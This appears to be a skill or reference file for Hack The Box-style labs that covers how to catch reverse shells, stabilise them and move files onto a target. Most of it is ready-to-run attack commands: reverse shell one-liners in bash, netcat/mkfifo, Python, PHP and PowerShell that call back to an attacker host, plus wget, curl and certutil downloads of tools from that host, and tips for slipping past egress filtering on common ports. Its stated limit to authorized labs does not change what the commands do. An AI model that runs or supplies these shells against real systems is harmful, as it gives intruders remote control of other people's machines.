---
name: htb-shells
description: >
  Obtaining and stabilizing reverse/bind shells on an authorized HTB box/lab.
  Trigger right after finding command execution or an injection point, or when an
  obtained shell is unstable. Covers: listeners (nc, socat, pwncat), reverse shell
  one-liners (bash, python, php, powershell, nc), upgrading to an interactive TTY
  shell, and transferring files to the target. Produces a stable interactive shell
  ready for enumeration.
metadata:
  type: reference
  category: shells
  legal: "Authorized targets only (HTB, labs, CTF, systems you own)."
---

# HTB — Reverse shells & stabilization

## When to use this skill
You can run a command on the target (RCE, webshell, injection) and want an
interactive shell on your side. `LHOST` = your VPN IP (`tun0`).

## 1) Set up a listener on your side
```bash
LHOST=$(ip -4 -o addr show tun0 | awk '{print $4}' | cut -d/ -f1); LPORT=4444
# simple
nc -lvnp $LPORT
# better (auto-stabilizes, history):
pwncat-cs -lp $LPORT
```

## 2) Trigger the reverse shell (target side)
```bash
# Bash
bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1
# classic nc / mkfifo if -e is absent
nc $LHOST $LPORT -e /bin/bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $LHOST $LPORT >/tmp/f
# Python
python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("'$LHOST'",'$LPORT'));[os.dup2(s.fileno(),f) for f in(0,1,2)];pty.spawn("/bin/bash")'
# PHP
php -r '$s=fsockopen("'$LHOST'",'$LPORT');exec("/bin/sh -i <&3 >&3 2>&3");'
```
```powershell
# PowerShell (Windows)
powershell -nop -c "$c=New-Object Net.Sockets.TCPClient('LHOST',LPORT);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$sb=([Text.Encoding]::ASCII).GetBytes($r+'PS>');$s.Write($sb,0,$sb.Length)}"
```
> Tip: `revshells.com` or pwncat generate these one-liners ready to use.

## 3) Stabilize a Linux shell (full TTY)
```bash
# in the remote shell
python3 -c 'import pty;pty.spawn("/bin/bash")'   # or python / script -qc /bin/bash /dev/null
export TERM=xterm
# Ctrl+Z to return to your side, then:
stty raw -echo; fg          # (enter)
# check the terminal size
stty rows 50 cols 200
```
With `pwncat-cs`, stabilization is automatic (Ctrl+D for the local console).

## 4) Transfer files to the target
```bash
# On your side: HTTP server
python3 -m http.server 80
# Linux target
wget http://$LHOST/linpeas.sh -O /tmp/linpeas.sh
curl http://$LHOST/tool -o /tmp/tool
# Windows target
certutil -urlcache -f http://LHOST/nc.exe nc.exe
powershell -c "iwr http://LHOST/winpeas.exe -o winpeas.exe"
# Via SMB (impacket) for Windows
impacket-smbserver share . -smb2support
#   copy \\LHOST\share\file.exe .
```

## Reflexes
- Always stabilize before working seriously (otherwise Ctrl+C kills the shell).
- Write to a writable directory: `/tmp`, `/dev/shm`, `C:\Windows\Temp`.
- If port 4444 is filtered, use 80/443/53 (often allowed outbound).
- Next: `htb-privesc`.
